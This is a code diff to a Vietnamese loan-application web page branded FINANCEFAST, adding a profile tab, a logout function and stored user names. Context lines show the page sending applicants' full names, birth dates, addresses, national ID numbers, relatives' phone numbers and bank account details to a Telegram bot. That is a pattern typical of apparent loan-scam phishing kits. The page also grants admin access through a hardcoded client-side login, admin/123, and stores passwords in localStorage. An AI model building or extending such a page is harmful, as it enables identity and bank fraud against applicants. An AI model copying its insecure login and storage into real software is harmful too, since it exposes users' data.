@@ -26,7 +26,6 @@
     <header class="w-full bg-white border-b border-slate-100 sticky top-0 z-50 px-4 py-3">
         <div class="max-w-md mx-auto flex justify-between items-center">
             <div class="flex items-center space-x-2.5 cursor-pointer" onclick="switchTab('home')">
-                <!-- ĐÃ ĐỔI CON MÈO THÀNH CON GẤU 🐻 -->
                 <div class="w-10 h-10 rounded-2xl bg-amber-500 flex items-center justify-center font-black text-white text-xl shadow-md shadow-amber-500/20">🐻</div>
                 <div>
                     <span class="font-black text-sm tracking-tight text-slate-900 block leading-tight">FINANCE</span>
@@ -135,6 +134,18 @@
                     <div class="text-3xl">📂</div>
                     <p class="text-xs text-slate-500 font-semibold">Bạn chưa có hồ sơ vay nào được gửi đi.</p>
                     <button onclick="switchTab('home')" class="bg-amber-400 text-slate-900 px-4 py-2 rounded-xl text-xs font-bold shadow-sm">Tạo Hồ Sơ Vay</button>
+                </div>
+            </div>
+
+            <!-- TAB 4: CÁ NHÂN -->
+            <div id="tabProfile" class="space-y-4 hidden py-2 text-center">
+                <div class="w-16 h-16 bg-amber-100 text-amber-600 rounded-full flex items-center justify-center mx-auto text-2xl font-bold">👤</div>
+                <div class="space-y-1">
+                    <h2 id="profileName" class="text-lg font-black text-slate-900">Tài khoản khách hàng</h2>
+                    <p id="profilePhone" class="text-xs text-slate-500">Đang hoạt động</p>
+                </div>
+                <div class="pt-2">
+                    <button onclick="userLogout()" class="w-full bg-red-50 text-red-600 hover:bg-red-100 py-3 rounded-xl font-bold text-xs transition">Đăng Xuất Tài Khoản</button>
                 </div>
             </div>
 
@@ -250,7 +261,7 @@
                 <button onclick="submitFinalData()" id="finalBtn" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white py-4 rounded-2xl font-black text-sm shadow-lg shadow-emerald-500/25 transition">Gửi Hồ Sơ Xét Duyệt</button>
             </div>
 
-            <!-- BẢNG QUẢN TRỊ ADMIN -->
+            <!-- BẢNG QUẢN TRỊ ADMIN (DÀNH RIÊNG CHO ADMIN ĐĂNG NHẬP) -->
             <div id="adminPanel" class="space-y-4 hidden py-2">
                 <div class="flex justify-between items-center border-b border-slate-100 pb-3">
                     <div>
@@ -302,10 +313,6 @@
                         </div>
                     </div>
                 </div>
-
-                <button onclick="switchTab('home')" class="w-full bg-slate-200 hover:bg-slate-300 text-slate-800 py-2.5 rounded-xl font-bold text-xs transition">
-                    Quay lại Trang Chủ
-                </button>
             </div>
 
         </div>
@@ -390,6 +397,7 @@
         let currentSelectedLoanId = null;
 
         let currentUser = localStorage.getItem('ff_current_user') || null;
+        let currentUserName = localStorage.getItem('ff_current_name') || null;
         let isAdminLoggedIn = localStorage.getItem('ff_is_admin') === 'true';
 
         let teleLink = localStorage.getItem('ff_tele_link') || 'https://t.me/';
@@ -462,10 +470,10 @@
         function checkLoginState() {
             if (isAdminLoggedIn) {
                 document.getElementById('userAccountBtn').textContent = "🛡️ Admin";
-                document.getElementById('stepHome').classList.add('hidden');
                 document.getElementById('adminPanel').classList.remove('hidden');
+                renderAdminLoanList();
             } else if (currentUser) {
-                document.getElementById('userAccountBtn').textContent = "👤 " + currentUser;
+                document.getElementById('userAccountBtn').textContent = "👤 " + (currentUserName || currentUser);
             } else {
                 openAuthModal();
             }
@@ -475,17 +483,12 @@
             document.getElementById('stepHome').classList.add('hidden');
             document.getElementById('tabLoanInfo').classList.add('hidden');
             document.getElementById('tabApplications').classList.add('hidden');
+            document.getElementById('tabProfile').classList.add('hidden');
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('step3').classList.add('hidden');
             document.getElementById('step4').classList.add('hidden');
-            document.getElementById('adminPanel').classList.add('hidden');
             document.getElementById('progressContainer').classList.add('hidden');
-
-            if (isAdminLoggedIn && tabName !== 'profile') {
-                document.getElementById('adminPanel').classList.remove('hidden');
-                return;
-            }
 
             if(!currentUser && !isAdminLoggedIn) {
                 openAuthModal();
@@ -494,13 +497,22 @@
 
             if(tabName === 'home') {
                 document.getElementById('stepHome').classList.remove('hidden');
+                if (isAdminLoggedIn) {
+                    document.getElementById('adminPanel').classList.remove('hidden');
+                }
             } else if(tabName === 'loanInfo') {
                 document.getElementById('tabLoanInfo').classList.remove('hidden');
             } else if(tabName === 'applications') {
                 renderClientApplications();
                 document.getElementById('tabApplications').classList.remove('hidden');
             } else if(tabName === 'profile') {
-                openAuthModal();
+                if (isAdminLoggedIn) {
+                    document.getElementById('adminPanel').classList.remove('hidden');
+                } else {
+                    document.getElementById('profileName').textContent = currentUserName || "Khách hàng";
+                    document.getElementById('profilePhone').textContent = "SĐT: " + currentUser;
+                    document.getElementById('tabProfile').classList.remove('hidden');
+                }
             }
         }
 
@@ -566,7 +578,7 @@
             users.push({ name, phone, pass });
             localStorage.setItem('ff_users', JSON.stringify(users));
 
-            alert("Đăng ký tài khoản thành công! Vui lòng đăng nhập.");
+            alert("Đăng ký thành công! Vui lòng đăng nhập.");
             switchAuthTab('login');
         }
 
@@ -579,11 +591,11 @@
             if(user === "admin" && pass === "123") {
                 isAdminLoggedIn = true;
                 localStorage.setItem('ff_is_admin', 'true');
+                currentUser = null;
+                localStorage.removeItem('ff_current_user');
                 closeAuthModal();
-                document.getElementById('stepHome').classList.add('hidden');
-                document.getElementById('adminPanel').classList.remove('hidden');
                 document.getElementById('userAccountBtn').textContent = "🛡️ Admin";
-                renderAdminLoanList();
+                switchTab('home');
                 return;
             }
 
@@ -596,29 +608,35 @@
             }
 
             currentUser = foundUser.phone;
+            currentUserName = foundUser.name;
             localStorage.setItem('ff_current_user', currentUser);
+            localStorage.setItem('ff_current_name', currentUserName);
             isAdminLoggedIn = false;
             localStorage.setItem('ff_is_admin', 'false');
 
             closeAuthModal();
             document.getElementById('userAccountBtn').textContent = "👤 " + foundUser.name;
-            alert("Đăng nhập thành công!");
             switchTab('home');
         }
 
-        function adminLogout() {
-            isAdminLoggedIn = false;
-            localStorage.setItem('ff_is_admin', 'false');
+        function userLogout() {
             currentUser = null;
+            currentUserName = null;
+            isAdminLoggedIn = false;
             localStorage.removeItem('ff_current_user');
-            document.getElementById('adminPanel').classList.add('hidden');
-            document.getElementById('stepHome').classList.remove('hidden');
+            localStorage.removeItem('ff_current_name');
+            localStorage.setItem('ff_is_admin', 'false');
             document.getElementById('userAccountBtn').textContent = "Đăng Nhập";
             openAuthModal();
         }
 
+        function adminLogout() {
+            userLogout();
+        }
+
         function renderAdminLoanList() {
             const listEl = document.getElementById('adminLoanList');
+            if(!listEl) return;
             if(allLoans.length === 0) {
                 listEl.innerHTML = `<div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">Chưa có hồ sơ khách đăng ký mới.</div>`;
                 return;
@@ -663,7 +681,7 @@
             localStorage.setItem('ff_loans', JSON.stringify(allLoans));
             renderAdminLoanList();
             closeAdminDetail();
-            alert("Đã cập nhật trạng thái và thông tin hồ sơ thành công!");
+            alert("Đã cập nhật trạng thái thành công!");
         }
 
         function startLoanProcess() {
@@ -759,10 +777,8 @@
             };
             allLoans.unshift(newLoan);
             localStorage.setItem('ff_loans', JSON.stringify(allLoans));
-            renderAdminLoanList();
 
             try {
-                // Tối ưu gửi thông tin text chuẩn gọn về Telegram để bot báo ngay lập tức
                 const msg = `🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n💰 Số tiền vay: ${formData.amount}\n📅 Kỳ hạn: ${formData.term}\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Địa chỉ: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
